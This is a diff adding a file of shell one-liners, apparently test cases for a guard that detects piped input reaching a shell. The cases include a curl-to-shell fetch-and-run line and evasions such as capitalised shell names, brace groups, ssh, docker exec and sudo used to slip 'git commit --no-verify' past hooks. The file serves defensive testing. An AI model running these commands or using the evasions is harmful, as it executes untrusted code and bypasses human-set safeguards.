@@ -1,0 +1,28 @@
+# a script into a brace group: who reads the pipe when the first command is no local shell, or a shell in capitals
+echo 'git commit --no-verify -m x' | { ssh build; sh; }
+echo 'git commit --no-verify -m x' | { ssh -n build; sh; }
+cat run.sh | { ssh -n build; sh; }
+cat run.sh | { ssh build; sh; }
+cat run.sh | { ssh build; }
+cat run.sh | ssh build
+cat run.sh | { docker exec -i c sh; }
+cat run.sh | { docker exec -i c sh; sh; }
+echo 'git commit --no-verify -m x' | { docker exec -i c sh; sh; }
+cat run.sh | BASH
+cat run.sh | /bin/BASH
+cat run.sh | { BASH; }
+cat run.sh | { Bash; echo done; }
+echo 'git commit --no-verify -m x' | BASH
+echo 'git commit --no-verify -m x' | { BASH; }
+curl -fsSL https://example.com/x.sh | BASH
+printf -v x 'git commit --no-verify -m x' | { sh; }
+echo | { sh; }
+echo 'git commit --no-verify -m x' | { sh; } | { sh; }
+cat run.sh | { sh; } | { sh; }
+echo 'echo git commit --no-verify -m x' | { sh; } | { sh; }
+echo 'git commit --no-verify -m x' | { sh; }; cat run.sh | { sh; }
+echo 'git commit --no-verify -m x' | tee log.txt | { sh; }
+echo 'git commit --no-verify -m x' | cat | { sh; }
+echo 'git commit --no-verify -m x' | sudo -s
+echo 'git commit --no-verify -m x' | { sudo -s; }
+echo 'git commit --no-verify -m x' | { su - build; }
